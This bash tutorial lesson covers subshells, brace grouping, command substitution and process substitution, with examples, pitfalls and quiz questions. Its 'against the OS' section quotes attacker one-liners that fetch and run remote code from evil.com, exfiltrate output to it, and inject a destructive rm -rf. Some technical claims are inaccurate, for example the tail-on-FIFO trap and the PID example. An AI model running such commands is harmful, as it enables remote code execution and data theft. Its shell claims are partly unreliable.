# Lesson 13: Subshells & Grouping

## History & Origins

Subshells are as old as the **Bourne shell** (1977). The `( )` syntax was borrowed from the **Thompson shell's** notion of grouping, but with a crucial twist: Bourne made it create a **new shell process**. This was revolutionary — it meant you could isolate changes (variables, directory, umask) inside a child environment without affecting the parent.

Grouping `{ }` in the same shell came slightly later — it was a natural optimization: "I want to redirect output for multiple commands, but I don't need a subshell for it."

Command substitution `$( )` originated in the **Korn shell** (ksh) in the 1980s, replacing the older backtick `` `cmd` `` syntax from Bourne shell. POSIX standardized `$( )` because it nests properly and is visually clearer.

Process substitution `<()` `>()` is a **ksh** invention that bash adopted in **bash 2.0** (1996). It solves a fundamental Unix problem: some tools (like `diff`) take file arguments, not stdin. Process substitution gives you a "file" that's actually the output of a command — a named pipe or `/dev/fd` entry.

The naming: "subshell" = a "sub" (subordinate) shell. "Grouping" = commands grouped together. "Process substitution" = substituting a process's output for a filename.

## Syntax Reference

### Subshell `( )`

```
(command1; command2; ...)
```

| Behaviour | Implication |
|-----------|-------------|
| Variable assignment | Lost when subshell exits |
| `cd` changes | Lost when subshell exits |
| `trap` handlers | Not inherited (unless exported) |
| `exit` | Exits only the subshell |
| File descriptors | Inherited from parent, changes lost |
| `$BASHPID` | Different from parent's `$$` in some cases |
| Performance | Fork + exec overhead |
| `$?` | Exit status of last command in subshell |

### Grouping `{ }`

```
{ command1; command2; ...; }
```

| Behaviour | Implication |
|-----------|-------------|
| Variable assignment | Persists in current shell |
| `cd` changes | Affects current shell |
| `trap` handlers | Runs in current shell |
| `exit` | Exits the entire script |
| Performance | No fork — same shell |
| `$?` | Exit status of last command in group |

### Command Substitution `$( )`

```
$(command)
`command`
```

| Variant | Behaviour |
|---------|-----------|
| `$(cmd)` | Runs `cmd` in subshell, captures stdout |
| `$(cmd1; cmd2)` | Multi-command substitution |
| `$(< file)` | Replace with file contents (bash 4.4+, no `cat` needed) |
| `` `cmd` `` | Legacy backtick form (avoid) |
| `$((expr))` | Arithmetic expansion (different thing!) |

**Nesting:** `$(echo $(echo "nested"))` works naturally. Backticks require `\`` escaping.

### Process Substitution

```
<(command)
>(command)
```

| Form | Behaviour |
|------|-----------|
| `<(cmd)` | Presents as a readable file (FIFO or `/dev/fd/N`) |
| `>(cmd)` | Presents as a writable file |
| `cat <(cmd1) <(cmd2)` | Multi-file concatenation of command outputs |

**Edge cases:**
- Not all programs handle process substitution (non-seekable FIFO)
- Must be used as an argument to a command, not standalone
- Bash creates the FIFO or uses `/dev/fd` if available
- Lasts only as long as the enclosing command

## Under the Hood

### OS/kernel mechanisms

**Subshell `( )`:**
1. Bash calls `fork(2)` — creates a child process that's an exact copy
2. The child has its own address space (copy-on-write), its own fd table, its own working directory
3. Commands inside `( )` run in the child
4. When the child exits (via `_exit(2)`), the parent continues
5. The child's changes are lost because they were made in a different address space

**Grouping `{ }`:**
1. No fork — commands run in the current shell process
2. Bash reads and executes them sequentially in the same interpreter loop
3. The `;` before `}` is required because `}` is a reserved word, not an operator

**Process substitution:**
1. Bash calls `pipe(2)` to create a pair of file descriptors
2. Calls `fork(2)` — the child exec's the command, writing to/reading from the pipe
3. The pipe fd is made available as `/dev/fd/N` (on Linux) or a named FIFO
4. The command gets a filename argument like `/dev/fd/63`

**strace for process substitution:**
```
pipe([3, 4])                            = 0
clone(child_stack=NULL, ...)            = 12345
# In child:
close(3)
dup2(4, 1)                               # stdout → pipe write end
execve("/usr/bin/echo", ["echo", "hello"], ...)
# In parent:
close(4)
# Now /dev/fd/3 contains the output of "echo hello"
```

### strace reveals

For `( cd /tmp; pwd )`:
```
clone(child_stack=NULL, ...) = 12345   # fork
# Child:
chdir("/tmp")                           # cd is actually the chdir syscall
# ... pwd runs ...
exit_group(0)                           # subshell exits
# Parent continues
```

For `{ cd /tmp; pwd; }`:
```
chdir("/tmp")                           # same process!
# ... pwd runs ...
```
No fork — that's the difference.

### Memory/performance model

- Subshell forks: O(1) memory at fork time (thanks to copy-on-write), but Linux has fork overhead (~1μs plus page table setup)
- Grouping: zero overhead
- Process substitution: fork + pipe — lightweight but not free
- Command substitution: fork + pipe + read all output into memory — expensive for large output
- `$(< file)` (bash 4.4+) reads a file without forking — much faster

## Core Examples (8-12 minimum)

### Example 1: Subshell isolation

**Command:**
```bash
x=1
( x=2; echo "Inside: $x" )
echo "Outside: $x"
```

**Output:**
```
Inside: 2
Outside: 1
```

**Step-by-step:**
1. `x=1` in the main shell
2. `( ... )` triggers a fork — child shell starts
3. Inside child: `x=2` sets x to 2 (in child's memory only)
4. Echo prints `2`
5. Child shell exits — all its state is destroyed
6. Back in parent: `$x` is still `1`

**Variations:**
- `cd` inside `( )` doesn't affect parent
- `umask` inside `( )` doesn't affect parent
- `trap` inside `( )` doesn't affect parent

### Example 2: Grouping preserves changes

**Command:**
```bash
x=1
{ x=2; echo "Inside: $x"; }
echo "Outside: $x"
```

**Output:**
```
Inside: 2
Outside: 2
```

**Step-by-step:**
1. `x=1` in the main shell
2. `{ ... }` — no fork, same shell
3. `x=2` changes x in the current shell
4. Both echos see `2`

**Variations:**
- `{ cd /tmp; pwd; }` — parent's directory changes!
- `{ exit; }` — exits the whole script, not just the block

### Example 3: Command substitution

**Command:**
```bash
files=$(ls | wc -l)
echo "Files: $files"
now=$(date +%s)
echo "Epoch: $now"
```

**Output:**
```
Files: 42
Epoch: 1753920000
```

**Step-by-step:**
1. `$(ls | wc -l)` runs in a subshell
2. `ls` lists files, pipes to `wc -l`
3. stdout is captured into variable `files`
4. `$(date +%s)` runs `date`, captures epoch time

**Variations:**
- `$(< file)` — reads file content without forking
- `$(cmd1; cmd2; cmd3)` — multi-command substitution
- `result=$(some_command 2>&1)` — capture stderr too

### Example 4: Process substitution — diff

**Command:**
```bash
diff <(ls /tmp) <(ls /var/tmp)
```

**Output:**
```
1,3c1,2
< file1.txt
< file2.txt
---
> backup.tar
```

**Step-by-step:**
1. `<(ls /tmp)` creates a FIFO — bash runs `ls /tmp` in background, writes output to FIFO
2. `<(ls /var/tmp)` creates another FIFO
3. `diff` receives two filenames: `/dev/fd/63` and `/dev/fd/62`
4. `diff` reads from both FIFOs as if they were files
5. Compares and outputs differences

**Variations:**
- `grep -f <(pattern_generator) data.txt` — dynamic pattern files
- `comm <(sort file1) <(sort file2)` — sorted comparison
- `paste <(cmd1) <(cmd2)` — side-by-side output

### Example 5: Process substitution — write side

**Command:**
```bash
tee >(gzip > output.gz) < input.txt
```

**Output:** `input.txt` is written to stdout AND piped through `gzip` to `output.gz`

**Step-by-step:**
1. `tee` reads from input.txt
2. `>(gzip > output.gz)` creates a writable FIFO
3. `tee` writes to stdout (visible) AND to the FIFO
4. `gzip` reads from FIFO, compresses, writes to `output.gz`
5. Simultaneous streaming — no temp file needed

**Variations:**
- Multiple outputs: `tee >(cmd1) >(cmd2) < input`
- `tar cf >(ssh host 'tar xf -') .` — stream tar over SSH without temp file
- `command > >(logger)` — pipe stdout to syslog

### Example 6: Grouping for redirection

**Command:**
```bash
{
    echo "=== Report $(date) ==="
    echo "--- Disk ---"
    df -h
    echo "--- Memory ---"
    free -h
} > /tmp/report.txt
```

**Output file (`/tmp/report.txt`):**
```
=== Report Thu Jul 31 12:00:00 UTC 2026 ===
--- Disk ---
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1       100G   50G   50G  50% /
--- Memory ---
              total        used        free
Mem:           15G         8G          7G
```

**Step-by-step:**
1. `{ }` groups all the commands
2. `> /tmp/report.txt` applies to the ENTIRE group
3. All stdout from all commands goes to the file
4. No subshell — variables set inside persist

**Variations:**
- `{ cmd1; cmd2; } 2>&1 | grep error` — merge stderr for the group
- `{ cmd1; cmd2; } | wc -l` — count lines from multiple commands

### Example 7: Background subshell

**Command:**
```bash
(sleep 3; echo "Task done") &
echo "Continuing immediately..."
wait
echo "Background finished"
```

**Output:**
```
Continuing immediately...
Task done
Background finished
```

**Step-by-step:**
1. `(sleep 3; echo "Task done") &` — subshell goes to background
2. Main shell immediately prints "Continuing immediately..."
3. 3 seconds later, the subshell prints "Task done"
4. `wait` blocks until the background job finishes
5. "Background finished" prints

**Variations:**
- `(cmd) &` instead of `cmd &` — useful when you need multiple commands in the background
- `{ cmd; } &` — same effect but no subshell (variables accessible)

### Example 8: Subshell for directory isolation

**Command:**
```bash
pwd
(cd /tmp; pwd; ls -la | head -3)
pwd
```

**Output:**
```
/home/phd/projects
/tmp
drwxrwxrwt  20 root root  4096 Jul 31 12:00 .
drwxr-xr-x  20 root root  4096 Jul 31 12:00 ..
-rw-r--r--   1 user user     0 Jul 31 12:00 tempfile
/home/phd/projects
```

**Step-by-step:**
1. `pwd` shows current directory
2. `(cd /tmp; ...)` — subshell does `cd /tmp`, lists files, all in child
3. After subshell exits, parent's directory is unchanged
4. This is the safest way to do temporary directory changes

**Variations:**
- `(cd /safe/dir; dangerous_command)` — limit blast radius
- `(cd "$project"; make clean; make build)` — isolated build

### Example 9: Nested command substitution

**Command:**
```bash
file=$(echo "report_$(date +%Y%m%d).txt")
echo "$file"
```

**Output:** `report_20260731.txt`

**Step-by-step:**
1. Inner `$(date +%Y%m%d)` runs first — produces `20260731`
2. Outer `$(echo "report_20260731.txt")` runs — captures the concatenated string
3. Result assigned to `$file`

**Variations:**
- Nested with backticks: `` `echo "report_\`date +%Y%m%d\`.txt"` `` — ugly!
- `$(< file)` reads a file directly

### Example 10: Grouping with pipes

**Command:**
```bash
{ echo "ERROR: file not found"; echo "WARN: low disk"; } | grep ERROR
```

**Output:**
```
ERROR: file not found
```

**Step-by-step:**
1. `{ }` groups two echo commands
2. Pipe sends group's combined stdout to `grep`
3. `grep ERROR` filters out only the error line
4. Without `{ }`, only the second echo would be piped

**Variations:**
- `{ cmd1; cmd2; } 2>&1 | less` — page through combined output
- Compare: `cmd1; cmd2 | less` vs `{ cmd1; cmd2; } | less` — big difference!

### Example 11: Command substitution with stderr capture

**Command:**
```bash
output=$(ls /nonexistent 2>&1)
echo "Captured: $output"
```

**Output:** `Captured: ls: cannot access '/nonexistent': No such file or directory`

**Step-by-step:**
1. `2>&1` redirects stderr to stdout
2. `$( )` captures stdout (which now includes stderr)
3. Even error messages are captured
4. Without `2>&1`, the error would print to terminal and variable would be empty

**Variations:**
- `output=$(cmd 2>&1 1>/dev/null)` — capture ONLY stderr
- `output=$(cmd 2>/dev/null)` — suppress errors, capture stdout

### Example 12: Pipeline vs process substitution for while loops

**Command:**
```bash
# Pipeline version (subshell — BAD)
count=0
echo -e "a\nb\nc" | while read line; do
    ((count++))
done
echo "Count: $count"  # prints 0!

# Process substitution (no subshell — GOOD)
count=0
while read line; do
    ((count++))
done < <(echo -e "a\nb\nc")
echo "Count: $count"  # prints 3
```

**Output:**
```
Count: 0
Count: 3
```

**Step-by-step:**
1. Pipeline: `echo | while` — the `while` loop runs in a subshell. `count` increments in the subshell and is lost.
2. Process substitution: `while ... done < <(cmd)` — the loop runs in the current shell. `count` persists.
3. This is probably the most common subshell trap in bash scripting.

**Variations:**
- `done < file` — same as process substitution, no subshell
- `done <<< "$var"` — here-string, no subshell

## Real-World Use Cases

### FOR the OS

- **Safe directory traversal**: `(cd /var/log && tar czf /tmp/logs.tar.gz .)` — no risk of changing the caller's directory
- **Temporary environment**: `(set -euo pipefail; do_critical_work)` — strict mode for just one section
- **Parallel processing**: `(cmd1) & (cmd2) & (cmd3) & wait` — fork multiple tasks
- **Build isolation**: `(cd build && cmake .. && make)` — isolated build without affecting the parent

### WITH the OS

- **Process substitution for sysadmin**: `diff <(mount) <(mount -o remount /)` — compare mounts before and after
- **Command substitution for log timestamps**: `logfile="app_$(date +%F).log"`
- **Grouping for log output**: `{ date; uptime; free; } >> system.log`
- **Subshell for file descriptor management**: `(exec 3>file; echo data >&3)` — fd 3 closed after subshell exits

### AGAINST THE OS (Security Perspective)

- **Command injection via `$()`**: If an attacker controls a string used in `$( )`, they can execute arbitrary commands. Example: `echo "User: $(whoami)"` — if an attacker could control the string, they could inject `$(rm -rf /)`.
- **Process substitution for fileless execution**: `source <(curl -s http://evil.com/payload)` — loads and executes remote code without writing to disk.
- **Subshell for privilege escalation via `SUID`**: Scripts with unintended SUID bits can use `(cmd)` to spawn privileged subshells.
- **Hidden exfiltration via `>()`**: `cmd > >(curl -X POST -d @- http://evil.com/collect)` — output is sent to attacker while the user sees normal output.
- **`$()` insecurely in SQL**: Injecting `$(id)` into a SQL query string via heredoc could leak data.

### FOR DEFENSE

- **Always quote `"$(cmd)"`** to prevent word splitting and glob expansion on the output
- **Use `read -r` with process substitution** to prevent backslash issues
- **Validate input before command substitution**: Never put unsanitized user input into `$()`
- **Prefer `printf '%s' "$var"` over `echo "$var"`** inside command substitution for predictable behavior
- **Use `sync` judiciously**: Don't fork subshells in tight loops — they're expensive
- **Cap process substitution output**: `cmd | head -c 1M` to limit memory use in `$(cmd)`

## Memory Aids

- **`( )`** = round parentheses = roundabout = it goes in a circle and comes back to where it started (no changes persist)
- **`{ }`** = curly braces = curly holds on tight (changes persist in the current shell)
- **`$( )`** = dolla-bill-parens = "give me the output of this command as a value"
- **Backticks `` ` ``** = "tick tock, outdated clock" (avoid them)
- **`<()`** = looks like a file being read from a command — the command is on the right, reading from the left
- **`>()`** = looks like a file being written to a command — data flows left to the command on the right
- **`{ echo hi; }`** = the space before `}` and the `;` before `}` — Semicolon Or Space, Every Single Time (SOSSET)

## Trap Vault (8-12 traps)

### Trap 1: Subshell variable loss in pipelines

**Problem:** Variable set in `while read` loop inside a pipe is empty afterward.

**Bad Example:**
```bash
total=0
cat file.txt | while read line; do
    ((total++))
done
echo "Total: $total"  # 0!
```

**Root Cause:** Pipelines create subshells. The `while` loop runs in a subshell; `total` is incremented there and lost.

**Fix:**
```bash
while read line; do
    ((total++))
done < file.txt   # no pipe, no subshell
```

### Trap 2: Forgetting the semicolon before `}`

**Problem:** Syntax error on `{ }` group.

**Bad Example:**
```bash
{ echo "hello" }  # syntax error
```

**Root Cause:** `}` is a reserved word that requires a command separator (`;` or newline) before it.

**Fix:**
```bash
{ echo "hello"; }
# or
{ echo "hello"
}
```

### Trap 3: Process substitution with non-seekable programs

**Problem:** `tail -n 100 <(command)` fails.

**Bad Example:**
```bash
tail -n 100 <(seq 1 1000)
```

**Root Cause:** `tail -n 100` normally seeks to the end of the file minus 100 lines. Process substitution creates a FIFO (pipe), which is non-seekable. `tail` can't seek backwards.

**Fix:** Use `cat` or `tail -f` doesn't work. Instead:
```bash
seq 1 1000 | tail -n 100  # pipe works because tail reads sequentially
# Or
tail -n 100 < <(seq 1 1000)  # same pipe
```

### Trap 4: `$(< file)` vs `$(cat file)` — they differ

**Problem:** Using `$(cat file)` when `$(< file)` would do.

**Root Cause:** `$(< file)` is a bash builtin — it reads the file directly in the current shell. `$(cat file)` forks, execs `cat`, reads it, then exits. Both work, but one is much faster.

**Fix:** Use `$(< file)` for file reading — no fork needed.

### Trap 5: forking too many subshells

**Problem:** Script is slow due to excessive forking.

**Bad Example:**
```bash
for i in {1..1000}; do
    result=$(echo $i | bc -l)  # forks 1000 times!
done
```

**Root Cause:** Each `$( )` creates a subshell. 1000 iterations = 1000 forks.

**Fix:**
```bash
for i in {1..1000}; do
    result=$((i * 1))  # builtin arithmetic, no fork
done
```

### Trap 6: Backtick nesting hell

**Problem:** Nested backtick command substitution fails.

**Bad Example:**
```bash
result=`echo `whoami``  # doesn't work as expected
```

**Root Cause:** Backticks don't nest. The inner `` `whoami` `` is interpreted as closing the outer backtick.

**Fix:** Use `$()`:
```bash
result=$(echo $(whoami))  # works
```

### Trap 7: Process substitution inside a subshell

**Problem:** `cmd < <(cmd2)` inside `$( )` hangs.

**Bad Example:**
```bash
output=$(diff <(ls dir1) <(ls dir2))
```

This actually works, but issues arise when:
```bash
output=$(while read line; do ... done < <(cmd))  # complex nesting
```

**Root Cause:** Complex nested process substitutions can exhaust file descriptors.

**Fix:** Use intermediate variables or files for complex cases.

### Trap 8: `exit` in subshell doesn't exit the script

**Problem:** `exit 1` inside `( )` doesn't stop the script.

**Bad Example:**
```bash
( invalid_command; exit 1 )
echo "Still running!"  # This executes!
```

**Root Cause:** `exit` inside a subshell only exits the subshell. The parent continues.

**Fix:** Check the subshell's exit code:
```bash
( invalid_command; exit 1 ) || exit 1
```

### Trap 9: Grouping with `{ }` and redirection creates race

**Problem:** Partial output from grouped commands when interrupted.

**Bad Example:**
```bash
{ echo "start"; sleep 2; echo "end"; } > /tmp/output.txt
# If interrupted mid-way, output.txt has "start" but not "end"
```

**Root Cause:** Redirection opens the file at the start of the group. If the group is interrupted, the file is partially written.

**Fix:** Write to temp file then rename:
```bash
{ echo "start"; sleep 2; echo "end"; } > /tmp/partial.txt
mv /tmp/partial.txt /tmp/output.txt
```

### Trap 10: `$$` vs `$BASHPID` in subshells

**Problem:** `$$` doesn't change in a subshell (it reports the parent PID).

**Bad Example:**
```bash
echo "Parent: $$"
( echo "Subshell: $$" )  # Same number!
echo "Subshell real: $BASHPID"  # Different!
```

**Root Cause:** `$$` expands to the PID of the **script/shell**, not the current subshell. `$BASHPID` always gives the actual current shell PID.

**Fix:** Use `$BASHPID` when you need the subshell's actual PID.

### Trap 11: Process substitution file descriptor leak

**Problem:** Running out of file descriptors from many process substitutions.

**Bad Example:**
```bash
for i in {1..1000}; do
    diff <(cmd1) <(cmd2)  # 2 new FDs per iteration, potentially leaking
done
```

**Root Cause:** Each `<()` eats a file descriptor. If not properly closed, they accumulate.

**Fix:** Limit the number, or use temp files for large batches.

## See It In The Wild

- **`/usr/bin/spectre-meltdown-checker`** — uses `diff <(cmd) <(cmd)` extensively for CPU comparisons
- **Bash completions** (`/usr/share/bash-completion/`) — heavy use of process substitution
- **Git's `git-completion.bash`** — many `$(cmd)` constructs for dynamic suggestions
- **Docker build scripts** — `docker run $(cat CONFIG_ARGS)` using command substitution
- **`/etc/profile.d/`** scripts — often use `$( )` for dynamic path setting

**Try this now:**

1. `echo "PID: $$, BASHPID: $BASHPID"; (echo "Subshell BASHPID: $BASHPID")` — see the difference
2. `{ date; uptime; who; } | md5sum` — hash of combined system info
3. `diff -y <(ls -1) <(ls -1at)` — side-by-side comparison of sorted vs time-sorted listing
4. `time bash -c 'for i in {1..100}; do : $(echo $i); done'` vs `time bash -c 'for i in {1..100}; do : $i; done'` — feel the fork pain

## Check Your Understanding (5-7 questions)

1. What's the difference between `( )` and `{ }` regarding variable scope?
2. Why does `while read line; do ... done < file` keep variables but `cat file | while read line; do ... done` does not?
3. What does process substitution `<()` actually create on disk?
4. What's the advantage of `$( )` over backticks?
5. What happens if you forget the space before `}` in a group command?
6. How do `$$` and `$BASHPID` differ in a subshell?
7. When would you choose `{ }` over `( )` for redirection?

---
*"Parentheses: what happens in the subshell stays in the subshell. Braces: there's no place like home."*
